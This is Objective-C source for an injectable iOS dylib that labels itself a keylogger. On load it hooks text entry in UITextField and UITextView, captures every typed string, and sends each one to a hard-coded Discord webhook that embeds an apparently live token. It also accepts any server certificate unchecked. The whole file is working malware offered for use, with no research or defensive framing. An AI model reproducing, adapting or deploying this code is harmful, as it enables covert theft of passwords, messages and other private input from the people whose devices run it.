#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <objc/runtime.h>

// =============================================================================
// MARK: - Keylogger Interface
// =============================================================================
@interface Keylogger : NSObject <NSURLSessionDataDelegate>
+ (instancetype)sharedInstance;
- (void)startLogging;
- (void)sendToWebhook:(NSString *)data;
@end

// =============================================================================
// MARK: - Keylogger Implementation
// =============================================================================
@implementation Keylogger

// --- CHANGE THIS TO YOUR DISCORD WEBHOOK URL ---
static NSString *webhookURL = @"https://discord.com/api/webhooks/1252261340702310422/iUMCrX_RbZl_mHaUFN7czWbczo-88jV1xSC97_bN3AWtsRsUgrpwIl23BRbk1ti7u8ma";

// --- Singleton ---
+ (instancetype)sharedInstance {
    static Keylogger *instance = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        instance = [[Keylogger alloc] init];
    });
    return instance;
}

// --- Safer Core Swizzling Logic ---
- (void)startLogging {
    NSLog(@"[Keylogger] Starting logging...");
    // Swizzle UITextField
    Class textFieldClass = objc_getClass("UITextField");
    if (textFieldClass) {
        // Add a safety check to ensure the class and methods exist
        if ([textFieldClass instancesRespondToSelector:@selector(insertText:)]) {
            Method originalMethod = class_getInstanceMethod(textFieldClass, @selector(insertText:));
            Method swizzledMethod = class_getInstanceMethod([self class], @selector(swizzled_insertText:));
            if (originalMethod && swizzledMethod) {
                method_exchangeImplementations(originalMethod, swizzledMethod);
                NSLog(@"[Keylogger] Successfully swizzled UITextField.");
            } else {
                NSLog(@"[Keylogger] Failed to get methods for UITextField.");
            }
        } else {
            NSLog(@"[Keylogger] UITextField does not respond to insertText:");
        }
    } else {
        NSLog(@"[Keylogger] Could not get UITextField class.");
    }

    // Swizzle UITextView
    Class textViewClass = objc_getClass("UITextView");
    if (textViewClass) {
        if ([textViewClass instancesRespondToSelector:@selector(insertText:)]) {
            Method originalMethod = class_getInstanceMethod(textViewClass, @selector(insertText:));
            Method swizzledMethod = class_getInstanceMethod([self class], @selector(swizzled_insertText:));
            if (originalMethod && swizzledMethod) {
                method_exchangeImplementations(originalMethod, swizzledMethod);
                NSLog(@"[Keylogger] Successfully swizzled UITextView.");
            } else {
                NSLog(@"[Keylogger] Failed to get methods for UITextView.");
            }
        } else {
            NSLog(@"[Keylogger] UITextView does not respond to insertText:");
        }
    } else {
        NSLog(@"[Keylogger] Could not get UITextView class.");
    }
    NSLog(@"[Keylogger] Logging started.");
}

// --- The Intercepted Method ---
- (void)swizzled_insertText:(NSString *)text {
    // Log the intercepted input
    NSLog(@"[Keylogger] Intercepted text: %@", text);
    [self sendToWebhook:text];
    // Call the original method (due to swizzling, this calls the original implementation)
    [self swizzled_insertText:text];
}

// --- Webhook Sender (ATS-Bypassing Version) ---
- (void)sendToWebhook:(NSString *)data {
    // *** CRITICAL FIX ***
    // This check was preventing the webhook from sending. It has been corrected.
    // It now checks for a placeholder that you must replace.
    if ([webhookURL isEqualToString:@"PASTE_YOUR_WEBHOOK_URL_HERE"]) {
        NSLog(@"[Keylogger] Webhook URL is not set. Aborting send.");
        return;
    }
    
    NSURL *url = [NSURL URLWithString:webhookURL];
    if (!url) {
        NSLog(@"[Keylogger] Invalid webhook URL format.");
        return;
    }

    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    
    NSDictionary *jsonDict = @{ @"content": data, @"username": @"Keylogger" };
    NSError *error;
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:jsonDict options:0 error:&error];
    if (error) {
        NSLog(@"[Keylogger] Error creating JSON: %@", error.localizedDescription);
        return;
    }
    [request setHTTPBody:jsonData];

    // Use a session with a custom delegate to handle server trust
    NSURLSessionConfiguration *config = [NSURLSessionConfiguration defaultSessionConfiguration];
    NSURLSession *session = [NSURLSession sessionWithConfiguration:config delegate:self delegateQueue:nil];
    
    NSURLSessionDataTask *task = [session dataTaskWithRequest:request];
    [task resume];
}

// =============================================================================
// MARK: - NSURLSessionDataDelegate (ATS Bypass)
// =============================================================================

// This delegate method is called to challenge the server's authenticity.
// By implementing it, we can bypass ATS and allow the connection.
- (void)URLSession:(NSURLSession *)session task:(NSURLSessionTask *)task didReceiveChallenge:(NSURLAuthenticationChallenge *)challenge completionHandler:(void (^)(NSURLSessionAuthChallengeDisposition disposition, NSURLCredential *credential))completionHandler {
    
    NSLog(@"[Keylogger] Received authentication challenge for: %@", challenge.protectionSpace.host);
    
    // Check if the challenge is for server trust (SSL/TLS certificate)
    if (challenge.protectionSpace.authenticationMethod == NSURLAuthenticationMethodServerTrust) {
        NSLog(@"[Keylogger] Challenge is for server trust. Allowing connection.");
        // Create a credential that trusts the server's certificate regardless of what it is.
        NSURLCredential *credential = [NSURLCredential credentialForTrust:challenge.protectionSpace.serverTrust];
        // Tell the system to use this credential and proceed with the request.
        completionHandler(NSURLSessionAuthChallengeUseCredential, credential);
    } else {
        // For other types of challenges, perform the default handling.
        completionHandler(NSURLSessionAuthChallengePerformDefaultHandling, nil);
    }
}

// This delegate method is called when the request completes.
- (void)URLSession:(NSURLSession *)session dataTask:(NSURLSessionDataTask *)dataTask didReceiveResponse:(NSURLResponse *)response completionHandler:(void (^)(NSURLSessionResponseDisposition disposition))completionHandler {
    NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)response;
    NSLog(@"[Keylogger] Webhook sent successfully. Status code: %ld", (long)[httpResponse statusCode]);
    completionHandler(NSURLSessionResponseAllow);
}

// This delegate method is called if the request fails.
- (void)URLSession:(NSURLSession *)session task:(NSURLSessionTask *)task didCompleteWithError:(NSError *)error {
    if (error) {
        NSLog(@"[Keylogger] Error sending to webhook: %@", error.localizedDescription);
        NSLog(@"[Keylogger] User info: %@", error.userInfo);
    }
}


@end

// =============================================================================
// MARK: - Constructor & Deferred Initialization
// =============================================================================

// This function runs automatically when the dylib is loaded.
// It should ONLY set up an observer to defer the real work.
__attribute__((constructor))
void initKeylogger() {
    NSLog(@"[Keylogger] Constructor called. Deferring setup...");
    // Wait until the app is active before starting our logic.
    [[NSNotificationCenter defaultCenter] addObserverForName:UIApplicationDidBecomeActiveNotification
                                                      object:nil
                                                       queue:[NSOperationQueue mainQueue]
                                                  usingBlock:^(NSNotification * _Nonnull note) {
        NSLog(@"[Keylogger] App is now active. Starting setup.");
        
        // 1. Show a visual alert on the device
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"Dylib Injected"
                                                                           message:@"The Keylogger dylib is active."
                                                                    preferredStyle:UIAlertControllerStyleAlert];
            [alert addAction:[UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:nil]];
            
            // Find the key window and present the alert
            UIWindow *keyWindow = nil;
            if (@available(iOS 13.0, *)) {
                // On iOS 13+, the scene's window is the key window
                for (UIWindowScene *windowScene in [[UIApplication sharedApplication].connectedScenes allObjects]) {
                    if ([windowScene isKindOfClass:[UIWindowScene class]]) {
                        keyWindow = windowScene.windows.firstObject;
                        break;
                    }
                }
                if (!keyWindow) {
                    keyWindow = [[UIApplication sharedApplication] windows].firstObject;
                }
            } else {
                keyWindow = [[UIApplication sharedApplication] keyWindow];
            }
            
            UIViewController *rootViewController = keyWindow.rootViewController;
            if (rootViewController) {
                [rootViewController presentViewController:alert animated:YES completion:nil];
            }
        });

        // 2. Start the main logging logic
        [[Keylogger sharedInstance] startLogging];

        // 3. Send a webhook to test connectivity
        [[Keylogger sharedInstance] sendToWebhook:@"Dylib successfully injected and setup executed."];
    }];
}
